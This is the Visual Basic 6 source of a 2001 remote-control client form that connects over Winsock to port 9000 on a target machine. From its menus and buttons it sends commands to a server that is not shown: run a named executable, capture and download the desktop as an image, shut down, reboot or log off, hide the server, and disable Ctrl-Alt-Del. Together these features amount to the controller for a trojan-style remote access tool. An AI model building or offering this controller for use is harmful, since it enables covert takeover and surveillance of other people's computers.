VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmClient 
   BackColor       =   &H00000000&
   Caption         =   "Remote Client"
   ClientHeight    =   3600
   ClientLeft      =   60
   ClientTop       =   630
   ClientWidth     =   4665
   Icon            =   "frmClient.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   3600
   ScaleWidth      =   4665
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   3120
      Top             =   120
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Frame Frame3 
      BackColor       =   &H80000008&
      Height          =   735
      Left            =   120
      TabIndex        =   12
      Top             =   2760
      Width           =   4455
      Begin VB.CommandButton cmdDesktop 
         Caption         =   "Save Desktop"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Left            =   120
         TabIndex        =   15
         Top             =   240
         Width           =   1455
      End
      Begin VB.CommandButton cmdDisconnect 
         Caption         =   "Disconnect"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Left            =   3120
         TabIndex        =   14
         Top             =   240
         Width           =   1215
      End
      Begin VB.CommandButton cmdClose 
         Caption         =   "Close Server"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Left            =   1680
         TabIndex        =   13
         Top             =   240
         Width           =   1335
      End
   End
   Begin VB.Frame Frame2 
      BackColor       =   &H80000008&
      Height          =   1695
      Left            =   120
      TabIndex        =   6
      Top             =   1080
      Width           =   4455
      Begin VB.CommandButton cmdExe 
         Caption         =   "Execute"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Left            =   3240
         TabIndex        =   10
         Top             =   840
         Width           =   1095
      End
      Begin VB.TextBox txtExe 
         Height          =   285
         Left            =   1440
         TabIndex        =   2
         Tag             =   "0"
         Top             =   840
         Width           =   1695
      End
      Begin VB.CommandButton cmdSend 
         Caption         =   "Send"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Left            =   3240
         TabIndex        =   8
         Top             =   240
         Width           =   1095
      End
      Begin VB.TextBox txtMessage 
         Height          =   285
         Left            =   1440
         TabIndex        =   1
         Tag             =   "0"
         Text            =   " "
         Top             =   240
         Width           =   1695
      End
      Begin VB.Label Label3 
         BackColor       =   &H80000008&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   11
         Top             =   1320
         Width           =   4215
      End
      Begin VB.Label Label4 
         BackColor       =   &H80000008&
         Caption         =   "Execute File"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   9
         Top             =   840
         Width           =   1335
      End
      Begin VB.Label Label2 
         BackColor       =   &H80000008&
         Caption         =   "Message"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   7
         Top             =   240
         Width           =   1095
      End
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H80000008&
      Height          =   735
      Left            =   120
      TabIndex        =   3
      Top             =   360
      Width           =   4455
      Begin VB.CommandButton cmdConnect 
         Caption         =   "Connect"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Left            =   3240
         TabIndex        =   5
         Top             =   240
         Width           =   1095
      End
      Begin VB.TextBox txtConnect 
         Height          =   285
         Left            =   1440
         TabIndex        =   0
         Tag             =   "0"
         Text            =   "127.0.0.1"
         Top             =   240
         Width           =   1695
      End
      Begin VB.Label Label1 
         BackColor       =   &H80000008&
         Caption         =   "Connect To : :"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   4
         Top             =   240
         Width           =   1215
      End
   End
   Begin VB.Shape shpGo 
      FillColor       =   &H0000FF00&
      FillStyle       =   0  'Solid
      Height          =   375
      Left            =   120
      Shape           =   3  'Circle
      Top             =   0
      Visible         =   0   'False
      Width           =   615
   End
   Begin VB.Shape shpWait 
      FillColor       =   &H0000FFFF&
      FillStyle       =   0  'Solid
      Height          =   375
      Left            =   2040
      Shape           =   3  'Circle
      Top             =   0
      Visible         =   0   'False
      Width           =   495
   End
   Begin VB.Shape shpError 
      FillColor       =   &H000000FF&
      FillStyle       =   0  'Solid
      Height          =   375
      Left            =   3840
      Shape           =   3  'Circle
      Top             =   0
      Visible         =   0   'False
      Width           =   495
   End
   Begin VB.Menu mnuServer 
      Caption         =   "&Server"
      Begin VB.Menu MnuServerShut 
         Caption         =   "S&hutdown"
      End
      Begin VB.Menu mnuServerLog 
         Caption         =   "&Log Off"
      End
      Begin VB.Menu mnuServerReboot 
         Caption         =   "&Reboot"
      End
      Begin VB.Menu mnu0 
         Caption         =   "-"
      End
      Begin VB.Menu mnuServerHide 
         Caption         =   "&Hide"
      End
      Begin VB.Menu mnuServerUn 
         Caption         =   "&UnHide"
      End
      Begin VB.Menu mnu1 
         Caption         =   "-"
      End
      Begin VB.Menu mnuServerExit 
         Caption         =   "&Exit"
      End
   End
   Begin VB.Menu mnuCtl 
      Caption         =   "&Ctl-Alt-Del"
      Begin VB.Menu mnuCtlDis 
         Caption         =   "&Disable"
      End
      Begin VB.Menu mnuCtlEna 
         Caption         =   "&Enable"
      End
   End
End
Attribute VB_Name = "frmClient"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
    '########################################'
    '   Programmed By Inderpal Singh         '
    '   Email: inderpal0@hotmail.com         '
    '   Date: Dec 18, 2001                   '
    '   Homepage: http://connect.to/lanserver'
    '########################################'

Option Explicit
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long

Private Sub cmdDesktop_Click()
    Open App.Path & "\Desktop.bmp" For Binary As #1
    bGettingDesktop = True
    bFileTransfer = True
    Winsock1.SendData "GET DESK_TOP"
    frmDownloading.Show , Me
End Sub

Private Sub cmdDisconnect_Click()
    Winsock1.Close
    Call Sconnect
    cmdDesktop.Enabled = False
    shpWait.Visible = True
    txtMessage.Enabled = False
    txtExe.Enabled = False
    Call Disconnect
    txtConnect.SetFocus
End Sub

Private Sub Form_Load()
    txtMessage.Enabled = False
    cmdSend.Enabled = False
    txtExe.Enabled = False
    cmdExe.Enabled = False
    cmdClose.Enabled = False
    cmdDisconnect.Enabled = False
    cmdDesktop.Enabled = False
End Sub

Private Sub cmdClose_Click()
    Winsock1.SendData "Closeserver#"
    DoEvents: DoEvents
    cmdDesktop.Enabled = False
    cmdSend.Enabled = False
    cmdExe.Enabled = False
    cmdDisconnect.Enabled = False
    cmdClose.Enabled = False
    cmdConnect.Enabled = True
    Label3.Caption = "Server is Closed"
    'End
End Sub

Private Sub cmdConnect_Click()
    If Winsock1.State <> sckConnected Then Winsock1.Close
    If txtConnect.Text = "" Then
        MsgBox "Please enter Hostname or IP", vbCritical
        txtConnect.SetFocus
        Exit Sub
    End If
    Winsock1.RemoteHost = txtConnect.Text
    'Change this to your host ip
    Winsock1.RemotePort = 9000
    Winsock1.Connect
    Call Sconnect
    shpWait.Visible = True
    DoEvents
    Label3.Caption = "Connecting to RemoteHost"
    Do Until Winsock1.State = sckConnected
        DoEvents: DoEvents
        If Winsock1.State = sckError Then
            Call Sconnect
            shpError.Visible = True
            Label3.Caption = "Error in Connecting"
            MsgBox "Error in connecting to Server", vbInformation, "Server Error"
            Exit Sub
        End If
    Loop
    Call Sconnect
    shpGo.Visible = True
    txtMessage.Enabled = True
    txtExe.Enabled = True
    Label3.Caption = "Connected"
    txtMessage.SetFocus
    Call Connect
    cmdDesktop.Enabled = True
End Sub

Private Sub mnuCtlDis_Click()
    If Winsock1.State = sckConnected Then
        Winsock1.SendData "Disable#"
    End If
End Sub

Private Sub mnuCtlEna_Click()
    If Winsock1.State = sckConnected Then
        Winsock1.SendData "Enable#"
    End If
End Sub

Private Sub mnuServerExit_Click()
    Unload Me
End Sub

Private Sub mnuServerHide_Click()
    If Winsock1.State = sckConnected Then
        Winsock1.SendData "Hide#"
    End If
End Sub

Private Sub mnuServerLog_Click()
     If Winsock1.State = sckConnected Then
        Winsock1.SendData "Logoff#"
    End If
End Sub

Private Sub mnuServerReboot_Click()
    If Winsock1.State = sckConnected Then
        Winsock1.SendData "Reboot#"
    End If
End Sub

Private Sub MnuServerShut_Click()
    If Winsock1.State = sckConnected Then
        Winsock1.SendData "Shutdown#"
    End If
End Sub

Private Sub mnuServerUn_Click()
    If Winsock1.State = sckConnected Then
        Winsock1.SendData "Unhide"
    End If
End Sub
Private Sub cmdExe_Click()
    If Winsock1.State = sckConnected Then
        If StrComp(Right(txtExe.Text, 4), ".exe", vbTextCompare = 0) Or StrComp(Right(txtExe.Text, 4), ".com", vbTextCompare = 0) Then
            Winsock1.SendData "Execute#" + txtExe.Text
        Else
            MsgBox "Please enter a valid .exe or .com file", vbInformation, "File Name Incorrect"
        End If
        DoEvents
        txtExe.Text = ""
        Call Sconnect
        shpGo.Visible = True
        Label3.Caption = "File Send"
        txtExe.SetFocus
    Else
        Call Sconnect
        shpError.Visible = True
        txtMessage.Text = ""
        MsgBox "Sorry, You are not connected to host", vbOKOnly, "Server Error"
        Label3.Caption = "Not currently connected to host"
        cmdDisconnect_Click
    End If
End Sub

Private Sub txtExe_KeyPress(KeyAscii As Integer)
    If KeyAscii = 13 Then
        cmdExe_Click
    End If
End Sub

Private Sub cmdSend_Click()
    If Winsock1.State = sckConnected Then
        Winsock1.SendData "Message#" + txtMessage.Text
        DoEvents
        txtMessage.Text = ""
        Call Sconnect
        shpGo.Visible = True
        Label3.Caption = "Message Send"
        txtExe.SetFocus
    Else
        Call Sconnect
        shpError.Visible = True
        txtMessage.Text = ""
        MsgBox "Sorry, You r not connected to host", vbOKOnly, "Server Error"
        Label3.Caption = "Not currently connected to host"
        cmdDisconnect_Click
    End If
End Sub

Private Sub txtMessage_KeyPress(KeyAscii As Integer)
    If KeyAscii = 13 Then
        cmdSend_Click
    End If
End Sub

Private Sub txtConnect_GotFocus()
    If txtConnect.Tag = 0 Then
        txtConnect.Tag = 1
        txtConnect.Text = ""
    End If
End Sub

Private Sub txtConnect_Validate(KeepFocus As Boolean)
    If txtConnect.Text = "" Then
        txtConnect.Text = "127.0.0.1"
        KeepFocus = False
        txtConnect.Tag = 0
    End If
End Sub

Private Sub txtMessage_Change()
    If txtMessage.Text <> "" Then
        cmdSend.Enabled = True
    Else
        cmdSend.Enabled = False
    End If
End Sub

Private Sub txtExe_change()
    If txtExe <> "" Then
        cmdExe.Enabled = True
    Else
        cmdExe.Enabled = False
    End If
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
    Dim sData As String
    Winsock1.GetData sData, vbString
    shpGo.Visible = True
    shpWait.Visible = False
    shpError.Visible = False
    
    If InStr(1, sData, "COMPLETE") <> 0 Then
        frmDownloading.ProgBar.Value = frmDownloading.ProgBar.Max
        MsgBox "File Received!", vbInformation, "Download Complete!"
        bFileTransfer = False
        Put #1, , sData
        Close #1
        Unload frmDownloading
        Set frmDownloading = Nothing
        DoEvents
        
        If bGettingDesktop = True Then
            bGettingDesktop = False
            Dim Paint As String
            Paint = App.Path & "\Desktop.bmp"
            Call ShellExecute(hwnd, "Open", Paint, "", App.Path, 1)
        End If
        Exit Sub
    End If
    
    If bFileTransfer = True Then
        If InStr(1, sData, "FILESIZE") <> 0 Then
            frmDownloading.lblBytes.Caption = CLng(Mid$(sData, 11, Len(sData)))
            frmDownloading.ProgBar.Max = CLng(Mid$(sData, 11, Len(sData)))
            Exit Sub
        End If
        Put #1, , sData
        With frmDownloading.ProgBar
            If (.Value + Len(sData)) <= .Max Then
                .Value = .Value + Len(sData)
            Else
                .Value = .Max
                DoEvents
            End If
        End With
    End If
End Sub

Private Sub Connect()
    cmdConnect.Enabled = False
    cmdDisconnect.Enabled = True
    cmdClose.Enabled = True
End Sub

Private Sub Disconnect()
    cmdConnect.Enabled = True
    cmdSend.Enabled = False
    cmdExe.Enabled = False
    cmdDisconnect.Enabled = False
    cmdClose.Enabled = False
End Sub

Private Sub Sconnect()
    shpGo.Visible = False
    shpWait.Visible = False
    shpError.Visible = False
End Sub
